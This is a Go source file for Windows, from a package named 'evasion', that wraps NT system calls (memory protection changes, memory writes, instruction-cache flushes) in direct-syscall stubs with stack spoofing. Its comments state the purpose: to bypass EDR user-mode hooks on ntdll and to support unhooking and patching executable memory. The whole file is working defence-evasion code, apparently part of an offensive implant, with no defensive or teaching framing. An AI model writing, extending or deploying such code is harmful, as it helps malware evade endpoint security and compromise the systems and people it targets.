//go:build windows
// +build windows

package evasion

import (
	"sync"
	"unsafe"
)

// NT system-call helpers — all routed through HGProc (direct syscall + stack
// spoof) so that EDR user-mode hooks on ntdll stubs never intercept them.
// This also breaks the circular dependency that existed when unhookNtdll()
// called ntProtect through a potentially-hooked LazyProc before cleaning ntdll.

const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1

var (
	hgNtProtectOnce sync.Once
	hgNtProtectProc *HGProc

	hgNtWriteOnce sync.Once
	hgNtWriteProc *HGProc

	hgNtFlushOnce sync.Once
	hgNtFlushProc *HGProc

	hgNtSetInfoOnce sync.Once
	hgNtSetInfoProc *HGProc
)

func getNtProtectProc() *HGProc {
	hgNtProtectOnce.Do(func() {
		hgNtProtectProc = NewHGProc("NtProtectVirtualMemory")
	})
	return hgNtProtectProc
}

func getNtWriteProc() *HGProc {
	hgNtWriteOnce.Do(func() {
		hgNtWriteProc = NewHGProc("NtWriteVirtualMemory")
	})
	return hgNtWriteProc
}

func getNtFlushProc() *HGProc {
	hgNtFlushOnce.Do(func() {
		hgNtFlushProc = NewHGProc("NtFlushInstructionCache")
	})
	return hgNtFlushProc
}

func getNtSetInfoProc() *HGProc {
	hgNtSetInfoOnce.Do(func() {
		hgNtSetInfoProc = NewHGProc("NtSetInformationProcess")
	})
	return hgNtSetInfoProc
}

// ntProtect changes memory protection via a direct NtProtectVirtualMemory
// syscall stub — bypasses any EDR hook on the ntdll dispatch path.
func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32, ok bool) {
	p := getNtProtectProc()
	if p == nil {
		return 0, false
	}
	baseAddr := addr
	regionSize := size
	r, _, _ := p.Call(
		ntCurrentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return oldProtect, r == 0
}

// ntWrite writes bytes directly via a direct NtWriteVirtualMemory syscall.
func ntWrite(dst uintptr, src []byte) bool {
	p := getNtWriteProc()
	if p == nil {
		return false
	}
	var written uintptr
	r, _, _ := p.Call(
		ntCurrentProcess,
		dst,
		uintptr(unsafe.Pointer(&src[0])),
		uintptr(len(src)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r == 0
}

// ntFlush flushes the CPU instruction cache after patching executable memory.
func ntFlush(addr uintptr, size uintptr) {
	p := getNtFlushProc()
	if p == nil {
		return
	}
	p.Call(ntCurrentProcess, addr, size)
}
